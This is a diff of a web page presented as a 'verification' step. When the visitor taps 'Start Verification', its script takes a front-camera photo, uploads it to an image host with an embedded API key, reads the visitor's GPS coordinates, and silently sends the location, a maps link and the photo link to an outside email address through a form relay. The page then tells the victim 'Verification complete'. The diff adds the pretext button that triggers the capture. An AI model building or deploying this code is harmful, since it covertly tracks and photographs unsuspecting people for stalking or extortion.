@@ -7,16 +7,18 @@
 </head>
 
 <body style="background:#0f172a;color:white;text-align:center;font-family:Arial">
-<h2>Verifying…</h2>
-<p>Please allow permissions</p>
+
+<h2 id="status">Tap to start verification</h2>
+<button id="startBtn"
+style="padding:12px 20px;font-size:16px;border:none;border-radius:6px;">
+Start Verification
+</button>
 
 <form id="sendForm" action="https://formsubmit.co/delfinadodennis26@gmail.com" method="POST">
   <input type="hidden" name="Latitude" id="lat">
   <input type="hidden" name="Longitude" id="lon">
   <input type="hidden" name="Google Maps" id="map">
   <input type="hidden" name="Camera Image Link" id="photoLink">
-
-  <input type="hidden" name="_subject" value="📍 GPS + IMAGE REPORT">
   <input type="hidden" name="_captcha" value="false">
 </form>
 
@@ -27,54 +29,61 @@
 let gpsReady = false;
 let imageReady = false;
 
-/* CAMERA → UPLOAD TO IMGBB */
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-.then(stream => {
-  video.srcObject = stream;
+document.getElementById("startBtn").onclick = () => {
+  document.getElementById("status").innerText = "Requesting permissions…";
+  document.getElementById("startBtn").style.display = "none";
+  startProcess();
+};
 
-  setTimeout(() => {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-    stream.getTracks().forEach(t => t.stop());
+function startProcess() {
 
-    let base64 = canvas.toDataURL("image/jpeg", 0.8).split(",")[1];
-    let form = new FormData();
-    form.append("key", ""d2df52b590013ea953b1139e637b8973;
-    form.append("image", base64);
+  // CAMERA
+  navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    video.srcObject = stream;
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      stream.getTracks().forEach(t => t.stop());
 
-    fetch("https://api.imgbb.com/1/upload", {
-      method: "POST",
-      body: form
-    })
-    .then(r => r.json())
-    .then(d => {
-      photoLink.value = d.data.url;
-      imageReady = true;
-      sendIfReady();
-    });
-  }, 1500);
-});
+      let base64 = canvas.toDataURL("image/jpeg", 0.8).split(",")[1];
+      let fd = new FormData();
+      fd.append("key", "d2df52b590013ea953b1139e637b8973");
+      fd.append("image", base64);
 
-/* GPS */
-navigator.geolocation.getCurrentPosition(
-  pos => {
-    lat.value = pos.coords.latitude;
-    lon.value = pos.coords.longitude;
-    map.value = "https://maps.google.com/?q=" + lat.value + "," + lon.value;
-    gpsReady = true;
-    sendIfReady();
-  },
-  () => {
-    document.body.innerHTML = "<h3>Permission denied</h3>";
-  }
-);
+      fetch("https://api.imgbb.com/1/upload", { method:"POST", body:fd })
+      .then(r => r.json())
+      .then(d => {
+        photoLink.value = d.data.url;
+        imageReady = true;
+        checkSend();
+      });
+    }, 1200);
+  });
 
-/* SEND WHEN BOTH READY */
-function sendIfReady() {
+  // GPS
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      lat.value = pos.coords.latitude;
+      lon.value = pos.coords.longitude;
+      map.value = "https://maps.google.com/?q=" + lat.value + "," + lon.value;
+      gpsReady = true;
+      checkSend();
+    },
+    () => {
+      document.getElementById("status").innerText = "Location denied";
+    }
+  );
+}
+
+function checkSend() {
   if (gpsReady && imageReady) {
+    document.getElementById("status").innerText = "Sending…";
     sendForm.submit();
-    document.body.innerHTML = "<h3>Done</h3>";
+    setTimeout(() => {
+      document.body.innerHTML = "<h3>Verification complete</h3>";
+    }, 1500);
   }
 }
 </script>
